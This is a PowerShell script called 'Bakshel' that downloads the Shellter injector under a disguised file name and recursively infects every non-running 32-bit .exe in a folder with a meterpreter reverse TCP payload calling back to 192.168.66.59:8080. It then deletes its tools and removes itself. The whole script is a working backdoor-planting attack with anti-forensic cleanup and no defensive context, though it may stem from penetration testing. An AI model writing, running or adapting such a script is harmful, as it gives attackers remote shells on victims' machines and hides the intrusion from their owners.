<# Bakshel v.1
Script to "enhance" all windows executables 
**** Chris N 
 #>
#$path = "C:\Users\work\Desktop\test32"  # Local Path to scan
$path = $args[0]

function UnZIPFile($file, $destination)
{
<#
Attempts to unzip zip files.
Takes as input the zip file and the destination path
#>

$shell = new-object -com shell.application
$zip = $shell.NameSpace($file)
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item)
}
}

function Get-ExecutableArch
{
    <#
       Attempts to read the MS-DOS and PE headers from an executable file to determine its type.
       The command returns one of four strings (assuming no errors are encountered while reading the
       file):
       "Unknown", "16-bit", "32-bit", or "64-bit" 
	#>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({ Test-Path -LiteralPath $_ -PathType Leaf })]
        [string]
        $Path
    )

    try
    {
        try
        {
            $stream = New-Object System.IO.FileStream(
                $PSCmdlet.GetUnresolvedProviderPathFromPSPath($Path),
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::Read
            )
        }
        catch
        {
            throw "Error opening file $Path for Read: $($_.Exception.Message)"
        }

        $exeType = 'Unknown'
        
        if ([System.IO.Path]::GetExtension($Path) -eq '.COM')
        {
            # 16-bit .COM files may not have an MS-DOS header.  We'll assume that any .COM file with no header
            # is a 16-bit executable, even though it may technically be a non-executable file that has been
            # given a .COM extension for some reason.

            $exeType = '16-bit'
        }

        $bytes = New-Object byte[](4)

        if ($stream.Length -ge 64 -and
            $stream.Read($bytes, 0, 2) -eq 2 -and
            $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A)
        {
            $exeType = '16-bit'

            if ($stream.Seek(0x3C, [System.IO.SeekOrigin]::Begin) -eq 0x3C -and
                $stream.Read($bytes, 0, 4) -eq 4)
            {
                if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($bytes, 0, 4) }
                $peHeaderOffset = [System.BitConverter]::ToUInt32($bytes, 0)

                if ($stream.Length -ge $peHeaderOffset + 6 -and
                    $stream.Seek($peHeaderOffset, [System.IO.SeekOrigin]::Begin) -eq $peHeaderOffset -and
                    $stream.Read($bytes, 0, 4) -eq 4 -and
                    $bytes[0] -eq 0x50 -and $bytes[1] -eq 0x45 -and $bytes[2] -eq 0 -and $bytes[3] -eq 0)
                {
                    $exeType = 'Unknown'

                    if ($stream.Read($bytes, 0, 2) -eq 2)
                    {
                        if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($bytes, 0, 2) }
                        $machineType = [System.BitConverter]::ToUInt16($bytes, 0)

                        switch ($machineType)
                        {
                            0x014C { $exeType = '32-bit' }
                            0x0200 { $exeType = '64-bit' }
                            0x8664 { $exeType = '64-bit' }
                        }
                    }
                }
            }
        }
        
        return $exeType
    }
    catch
    {
        throw
    }
    finally
    {
        if ($null -ne $stream) { $stream.Dispose() }
    }
    
}


Invoke-WebRequest "https://www.shellterproject.com/Downloads/Shellter/Latest/shellter.zip" -OutFile "$env:TEMP\office_.zip";mkdir -force $env:TEMP\TCD505A_.tmp  

UnZIPFile -File $env:TEMP\office_.zip -Destination $env:TEMP\TCD505A_.tmp;rm $env:TEMP\office_.zip    #download,unzip and delete the original file



Get-ChildItem $path -recurse -Force 2> $null | where {$_.extension -eq ".exe"} `
| Sort-Object -Property FullName -Descending `
| ForEach-Object {
    $ExeType = Get-ExecutableArch -Path $_.FullName

    $curDir = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
   
    if ($ExeType.IndexOf("32") -ne -1) {               # Check file archirect is x86 -- shellter does not support x64
        
        write-host "`n"
        write-host "`n"
        write-host "@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Next File @@@@@@@@@@@@@@@@@@@@@@@@@@@"
        
        write-host "`n"
        write-host "`n"
        write-host "32-Bit Type"
    
        try {
            Write-Host "Target file is: " $_.FullName -->

            $FileFullPath=$_.FullName
            $ps= $_.FullName.Split('\\')[-1]
            
            $ps = $ps.Split('.')[0]       # Get current name

            $ProcessActive = Get-Process $ps -ErrorAction SilentlyContinue
             
           if($ProcessActive -eq $null){              # Check if the file is already running

          

           #exist in the loop only for a specific time to avoid errors 
             
                  
                Write-Host "Proceed to injector..."

                $ShellterParam = "-a"," -f"," $FileFullPath"," -s"," -p meterpreter_reverse_tcp"," --lhost 192.168.66.59"," --port 8080" 


               #Invoke-Expression "$env:TEMP\TCD505A_.tmp\shellter\shellter.exe" -a -f $_.FullName -p meterpreter_reverse_tcp --lhost 192.168.66.59 --port 8080  # run shellter from script path

               Start-Process -FilePath "$env:TEMP\TCD505A_.tmp\shellter\shellter.exe" -ArgumentList $ShellterParam -WindowStyle Hidden
                
                $ShelProc = Get-Process "shellter" 
                
                $elapsTime = 0

                while (!$ShelProc.HasExited -and $elapsTime -lt 150) #let the program run for no more than 150 sec
                {  
                    sleep -Seconds 1
                    $elapsTime += 1
                }

                # If the process is still active kill it
                if (!$ShelProc.HasExited) {
                    $ShelProc.Kill()
                Write-Host "Job done..."
            }
                 else {
                     Write-Host "Everything ok..Job Done"    # Skip    
                            }   
             }
            
             else {
                Write-Host "Already Running...Quitting"    # Skip
            }

        }
        catch {
            Write-Host "Someting Failed!!"   # skip
        }
    } 
    else {
        write-host "`n"
        write-host "`n"
        write-host "@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Next File @@@@@@@@@@@@@@@@@@@@@@@@@@@"
        
        write-host "`n"
        write-host "`n"
        Write-Host "Target file is: " $_.FullName -->
            write-host "64-Bit file Type.. leaving.."  }
}


rm -Recurse -Force $env:TEMP\TCD505A_.tmp   # removes the shellter folder
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force  #the script removes itself


